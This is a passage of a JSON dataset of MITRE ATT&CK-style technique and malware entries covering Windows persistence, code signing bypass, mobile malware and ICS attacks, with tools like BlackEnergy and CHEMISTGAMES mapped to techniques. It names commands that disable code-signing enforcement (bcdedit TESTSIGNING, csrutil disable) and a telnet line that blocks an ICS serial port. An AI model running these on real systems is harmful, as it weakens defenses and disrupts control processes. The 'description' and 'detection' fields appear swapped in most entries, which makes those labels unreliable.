                "detection": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg. \n\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\n\nAn adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. \n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0343",
            "type": "tool",
            "attributes": {
                "name": "Exaramel for Windows",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Exaramel for Windows is a backdoor used for targeting Windows systems. The Linux version is tracked separately under Exaramel for Linux.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1036.004": "Masquerade Task or Service",
                    "T1543.003": "Windows Service",
                    "T1112": "Modify Registry"
                }
            },
            "val": 7
        },
        {
            "id": "S0231",
            "type": "tool",
            "attributes": {
                "name": "Invoke-PSImage",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Invoke-PSImage takes a PowerShell script and embeds the bytes of the script into the pixels of a PNG image. It generates a one liner for executing either from a file of from the web. Example of usage is embedding the PowerShell code from the Invoke-Mimikatz module and embed it into an image file. By calling the image file from a macro for example, the macro will download the picture and execute the PowerShell code, which in this case will dump the passwords.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 1
        },
        {
            "id": "T1553.006",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Code Signing Policy Modification",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such as <code>bcdedit.exe -set TESTSIGNING ON</code>.(Citation: Microsoft TESTSIGNING Feb 2021) Consider monitoring for modifications made to Registry keys associated with code signing policies, such as <code>HKCU\\Software\\Policies\\Microsoft\\Windows NT\\Driver Signing</code>. Modifications to the code signing policy of a system are likely to be rare.",
                "detection": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. \n\nSome of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.\n\nAdversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory. Examples of commands that can modify the code signing policy of a system include <code>bcdedit.exe -set TESTSIGNING ON</code> on Windows and <code>csrutil disable</code> on macOS. Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.\n\nTo gain access to kernel memory to modify variables related to signature checks, such as modifying <code>g_CiOptions</code> to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1574.010",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Services File Permissions Weakness",
                "chain_phase": "persistence",
                "description": "Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1547.009",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Shortcut Modification",
                "chain_phase": "persistence",
                "description": "Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\nMonitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)",
                "detection": "Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1120",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Peripheral Device Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1070",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Indicator Removal on Host",
                "chain_phase": "defense-evasion",
                "description": "File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.",
                "detection": "Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/*.\n\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T0869",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Application Layer Protocol",
                "chain_phase": "command-and-control-ics",
                "description": [],
                "detection": "Adversaries may establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus. These protocols may be used to disguise adversary actions as benign network traffic. Standard protocols may be seen on their associated port or in some cases over a non-standard port.\n\nAdversaries may use these protocols to reach out of the network for command and control, or in some cases to other infected devices within the network.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0859",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Valid Accounts",
                "chain_phase": "persistence-ics",
                "description": [],
                "detection": "Adversaries may steal the credentials of a specific user or service account using credential access techniques. In some cases, default credentials for control system devices may be publicly available. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network, and may even be used for persistent access to remote systems. Compromised and default credentials may also grant an adversary increased privilege to specific systems and devices or access to restricted areas of the network. Adversaries may choose not to use malware or tools, in conjunction with the legitimate access those credentials provide, to make it harder to detect their presence or to control devices and send legitimate commands in an unintended way. Adversaries may also create accounts, sometimes using predefined account names and passwords, to provide a means of backup access for persistence. The overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) and possibly between the enterprise and operational technology environments. Adversaries may be able to leverage valid credentials from one system to gain access to another system.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Data Historian",
                    "Engineering Workstation",
                    "Field Controller/RTU/PLC/IED",
                    "Human-Machine Interface",
                    "Input/Output Server",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0865",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Spearphishing Attachment",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may use a spearphishing attachment, a variant of spearphishing, as a form of a social engineering attack against specific targets. Spearphishing attachments are different from other forms of spearphishing in that they employ malware attached to an email. All forms of spearphishing are electronically delivered and target a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution and access.",
                "is_subtype": false,
                "platforms": [
                    "Engineering Workstation",
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian"
                ]
            }
        },
        {
            "id": "S0089",
            "type": "tool",
            "attributes": {
                "name": "BlackEnergy",
                "aliases": [
                    "Black Energy"
                ],
                "labels": [
                    "malware"
                ],
                "description": "BlackEnergy is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1553.006": "Code Signing Policy Modification",
                    "T1071.001": "Web Protocols",
                    "T1574.010": "Services File Permissions Weakness",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1552.001": "Credentials In Files",
                    "T1548.002": "Bypass User Account Control",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1485": "Data Destruction",
                    "T1120": "Peripheral Device Discovery",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels",
                    "T0869": "Standard Application Layer Protocol",
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment"
                }
            },
            "val": 28
        },
        {
            "id": "T1605",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Command-Line Interface",
                "chain_phase": "execution",
                "description": "Command-Line Interface execution can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.",
                "detection": "Adversaries may use built-in command-line interfaces to interact with the device and execute commands. Android provides a bash shell that can be interacted with over the Android Debug Bridge (ADB) or programmatically using Java’s `Runtime` package. On iOS, adversaries can interact with the underlying runtime shell if the device has been jailbroken.\n\nIf the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1575",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Native Code",
                "chain_phase": "defense-evasion",
                "description": "This is abuse of standard OS-level APIs and are therefore typically undetectable to the end user.",
                "detection": "Adversaries may use Android’s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions. Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.\n\nThe NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have. The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.\n\nAdversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1533",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Local System",
                "chain_phase": "collection",
                "description": "Accessing data from the local system can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.",
                "detection": "Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system.\n\nLocal system data includes information stored by the operating system. Access to local system data often requires escalated privileges (e.g. root access). Examples of local system data include authentication tokens, the device keyboard cache, Wi-Fi passwords, and photos.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1521",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Cryptographic Protocol",
                "chain_phase": "command-and-control",
                "description": "Since data encryption is a common practice in many legitimate applications and uses standard programming language-specific APIs, encrypting data for command and control communication is undetectable to the user.",
                "detection": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1474",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Supply Chain Compromise",
                "chain_phase": "initial-access",
                "description": "* Insecure third-party libraries could be detected by application vetting techniques. For example, Google's [App Security Improvement Program](https://developer.android.com/google/play/asi) detects the use of third-party libraries with known vulnerabilities within Android apps submitted to the Google Play Store.\n* Malicious software development tools could be detected by enterprises deploying integrity checking software to the computers that they use to develop code to detect presence of unauthorized, modified software development tools.",
                "detection": "As further described in Supply Chain Compromise, supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Somewhat related, adversaries could also identify and exploit inadvertently present vulnerabilities. In many cases, it may be difficult to be certain whether exploitable functionality is due to malicious intent or simply inadvertent mistake.\n\nThird-party libraries incorporated into mobile apps could contain malicious behavior, privacy-invasive behavior, or exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or could exploit inadvertent vulnerabilities. For example, security issues have previously been identified in third-party advertising libraries incorporated into apps..",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1475",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Deliver Malicious App via Authorized App Store",
                "chain_phase": "initial-access",
                "description": "* An EMM/MDM or mobile threat defense solution can identify the presence of unwanted or known insecure or malicious apps on devices.\n* Developers can scan (or have a third party scan on their behalf) the app stores for presence of unauthorized apps that were submitted using the developer's identity.",
                "detection": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. Mobile devices often are configured to allow application installation only from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may seek to place a malicious application in an authorized app store, enabling the application to be installed onto targeted devices.\n\nApp stores typically require developer registration and use vetting techniques to identify malicious applications. Adversaries may use these techniques against app store defenses:\n\n* Download New Code at Runtime\n* Obfuscated Files or Information\n\nAdversaries may also seek to evade vetting by placing code in a malicious application to detect whether it is running in an app analysis environment and, if so, avoid performing malicious actions while under analysis.    \n\nAdversaries may also use fake identities, payment cards, etc., to create developer accounts to publish malicious applications to app stores. \n\nAdversaries may also use control of a target's Google account to use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account.   (Only applications that are available for download through the Google Play Store can be remotely installed using this technique.)",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1444",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Masquerade as Legitimate Application",
                "chain_phase": "initial-access",
                "description": "Users can detect malicious applications by watching for nuances that could indicate the application is not the intended one when it is being installed.",
                "detection": "An adversary could distribute developed malware by masquerading the malware as a legitimate application. This can be done in two different ways: by embedding the malware in a legitimate application, or by pretending to be a legitimate application.\n\nEmbedding the malware in a legitimate application is done by downloading the application, disassembling it, adding the malicious code, and then re-assembling it. The app would appear to be the original app, but would contain additional malicious functionality. The adversary could then publish the malicious application to app stores or use another delivery method.\n\nPretending to be a legitimate application relies heavily on lack of scrutinization by the user. Typically, a malicious app pretending to be a legitimate one will have many similar details as the legitimate one, such as name, icon, and description.\n\nMalicious applications may also masquerade as legitimate applications when requesting access to the accessibility service in order to appear as legitimate to the user, increasing the likelihood that the access will be granted.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1437",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": [],
                "detection": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.\n\nIn the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push Notification Service (APNS; one-way server-to-device) are commonly used protocols on Android and iOS respectively that would blend in with routine device traffic and are difficult for enterprises to inspect. Google reportedly responds to reports of abuse by blocking access to GCM.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1406",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Obfuscated Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Malicious obfuscation of files or information can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.",
                "detection": "An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or decrypt the code at runtime to evade many app vetting techniques.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1426",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Information Discovery",
                "chain_phase": "discovery",
                "description": [],
                "detection": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, and architecture.\n\nOn Android, much of this information is programmatically accessible to applications through the android.os.Build class.\n\nOn iOS, techniques exist for applications to programmatically access this information.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1407",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Download New Code at Runtime",
                "chain_phase": "defense-evasion",
                "description": "Downloading new code at runtime can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.",
                "detection": "An app could download and execute dynamic code (not included in the original application package) after installation to evade static analysis techniques (and potentially dynamic analysis techniques) used for application vetting or application store review.\n\nOn Android, dynamic code could include native code, Dalvik code, or JavaScript code that uses the Android WebView's JavascriptInterface capability.\n\nOn iOS, techniques also exist for executing dynamic code downloaded after application installation.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1430",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Location Tracking",
                "chain_phase": "collection",
                "description": "On both Android (6.0 and up) and iOS, the user can view which applications have permission to access device location through the device settings screen, and the user can choose to revoke the permissions.",
                "detection": "An adversary could use a malicious or exploited application to surreptitiously track the device's physical location through use of standard operating system APIs.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "S0555",
            "type": "tool",
            "attributes": {
                "name": "CHEMISTGAMES",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CHEMISTGAMES is a modular backdoor that has been deployed by Sandworm Team.",
                "platforms": [
                    "Android"
                ],
                "techniques": {
                    "T1605": "Command-Line Interface",
                    "T1575": "Native Code",
                    "T1533": "Data from Local System",
                    "T1521": "Standard Cryptographic Protocol",
                    "T1474": "Supply Chain Compromise",
                    "T1475": "Deliver Malicious App via Authorized App Store",
                    "T1444": "Masquerade as Legitimate Application",
                    "T1437": "Standard Application Layer Protocol",
                    "T1406": "Obfuscated Files or Information",
                    "T1426": "System Information Discovery",
                    "T1407": "Download New Code at Runtime",
                    "T1430": "Location Tracking"
                }
            },
            "val": 12
        },
        {
            "id": "T0888",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Remote System Information Discovery",
                "chain_phase": "discovery-ics",
                "description": [],
                "detection": "An adversary may attempt to get detailed information about remote systems and their peripherals, such as make/model, role, and configuration. Adversaries may use information from Remote System Information Discovery to aid in targeting and shaping follow-on behaviors. For example, the system’s operational role and model information can dictate whether it is a relevant target for the adversary’s operational objectives. In addition, the system’s configuration may be used to scope subsequent technique usage. Requests for system information are typically implemented using automation and management protocols and are often automatically requested by vendor software during normal operation. This information may be used to tailor management actions, such as program download and system or module firmware. An adversary may leverage this same information by issuing calls directly to the system’s API.",
                "is_subtype": false,
                "platforms": [
                    "Safety Instrumented System/Protection Relay",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0837",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Protection",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions. This can result in equipment damage, prolonged process disruptions and hazards to personnel. Many faults and abnormal conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage. Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked. Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0800",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Activate Firmware Update Mode",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may activate firmware update mode on devices to prevent expected response functions from engaging in reaction to an emergency or process malfunction. For example, devices such as protection relays may have an operation mode designed for firmware installation. This mode may halt process monitoring and related functions to allow new firmware to be loaded. A device left in update mode may be placed in an inactive holding state if no firmware is provided to it. By entering and leaving a device in this mode, the adversary may deny its usual functionalities.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay"
                ]
            }
        },
        {
            "id": "T0805",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Block Serial COM",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may block access to serial COM to prevent instructions or configurations from reaching target devices. Serial Communication ports (COM) allow communication with control system devices. Devices can receive command and configuration messages over such serial COM. Devices also use serial COM to send command and reporting messages. Blocking device serial COM may also block command messages and block reporting messages. \n\nA serial to Ethernet converter is often connected to a serial COM to facilitate communication between serial and Ethernet devices. One approach to blocking a serial COM would be to create and hold open a TCP session with the Ethernet side of the converter. A serial to Ethernet converter may have a few ports open to facilitate multiple communications. For example, if there are three serial COM available -- 1, 2 and 3 --, the converter might be listening on the corresponding ports 20001, 20002, and 20003. If a TCP/IP connection is opened with one of these ports and held open, then the port will be unavailable for use by another party. One way the adversary could achieve this would be to initiate a TCP session with the serial to Ethernet converter at <code>10.0.0.1</code> via Telnet on serial port 1 with the following command: <code>telnet 10.0.0.1 20001</code>.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Input/Output Server"
                ]
            }
        },
        {
            "id": "T0810",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data Historian Compromise",
                "chain_phase": "initial-access-ics",
                "description": [],
                "detection": "Adversaries may compromise and gain control of a data historian to gain a foothold into the control system environment. Access to a data historian may be used to learn stored database archival and analysis information on the control system. A dual-homed data historian may provide adversaries an interface from the IT environment to the OT environment. \n\nDragos has released an updated analysis on CrashOverride that outlines the attack from the ICS network breach to payload delivery and execution.   The report summarized that CrashOverride represents a new application of malware, but relied on standard intrusion techniques. In particular, new artifacts include references to a Microsoft Windows Server 2003 host, with a SQL Server. Within the ICS environment, such a database server can act as a data historian. Dragos noted a device with this role should be \"expected to have extensive connections\" within the ICS environment. Adversary activity leveraged database capabilities to perform reconnaissance, including directory queries and network connectivity checks.\n\nPermissions Required: Administrator\n\nContributors: Joe Slowik - Dragos",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0815",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Denial of View",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may cause a denial of view in attempt to disrupt and prevent operator oversight on the status of an ICS environment. This may manifest itself as a temporary communication failure between a device and its control source, where the interface recovers and becomes available once the interference ceases.    \n\nAn adversary may attempt to deny operator visibility by preventing them from receiving status and reporting messages. Denying this view may temporarily block and prevent operators from noticing a change in state or anomalous behavior. The environment's data and processes may still be operational, but functioning in an unintended or adversarial manner.\n\nIn the Maroochy attack, the adversary was able to temporarily shut an investigator out of the network, preventing them from viewing the state of the system.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0827",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Loss of Control",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may seek to achieve a sustained loss of control or a runaway condition in which operators cannot issue any commands even if the malicious interference has subsided. The German Federal Office for Information Security (BSI) reported a targeted attack on a steel mill in its 2014 IT Security Report. These targeted attacks affected industrial operations and resulted in breakdowns of control system components and even entire installations. As a result of these breakdowns, massive impact resulted in damage and unsafe conditions from the uncontrolled shutdown of a blast furnace.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0806",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Brute Force I/O",
                "chain_phase": "impair-process-control",
                "description": [],
                "detection": "Adversaries may brute force I/O addresses on a device and attempt to exhaustively perform an action. By enumerating the full range of I/O addresses, an adversary may manipulate a process function without having to target specific I/O interfaces. More than one process function manipulation and enumeration pass may occur on the targeted I/O range in a brute force attempt.",
                "is_subtype": false,
                "platforms": [
                    "Control Server",
                    "Field Controller/RTU/PLC/IED"
                ]
            }
        },
        {
            "id": "T0802",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Automated Collection",
                "chain_phase": "collection-ics",
                "description": [],
                "detection": "Adversaries may automate collection of industrial environment information using tools or scripts. This automated collection may leverage native control protocols and tools available in the control systems environment. For example, the OPC protocol may be used to enumerate and gather information. Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.",
                "is_subtype": false,
                "platforms": [
                    "Field Controller/RTU/PLC/IED",
                    "Safety Instrumented System/Protection Relay",
                    "Control Server"
                ]
            }
        },
        {
            "id": "T0831",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Manipulation of Control",
                "chain_phase": "impact-ics",
                "description": [],
                "detection": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection. Methods of Manipulation of Control include: Man-in-the-middle, Spoof command message, Changing setpoints. A Polish student used a remote controller device to interface with the Lodz city tram system in Poland. Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops.Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T0840",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Connection Enumeration",
                "chain_phase": "discovery-ics",
                "description": [],
                "detection": "Adversaries may perform network connection enumeration to discover information about device communication patterns. If an adversary can inspect the state of a network connection with tools, such as https://en.wikipedia.org/wiki/Netstat netstat, in conjunction with <span class=\"smw-format list-format \"><span class=\"smw-row\"><span class=\"smw-field\"><span class=\"smw-value\">System Firmware</span></span></span></span>, then they can determine the role of certain devices on the network  . The adversary can also use Network Sniffing to watch network traffic for details about the source, destination, protocol, and content.",
                "is_subtype": false,
                "platforms": [
                    "Human-Machine Interface"
                ]
            }
        },
        {
            "id": "T0881",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Service Stop",
                "chain_phase": "inhibit-response-function",
                "description": [],
                "detection": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nServices may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct Data Destruction.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Human-Machine Interface",
                    "Control Server",
                    "Data Historian",
                    "Engineering Workstation"
                ]
            }
        },
        {
            "id": "T0803",
            "type": "technique",
            "val": null,
            "attributes": {
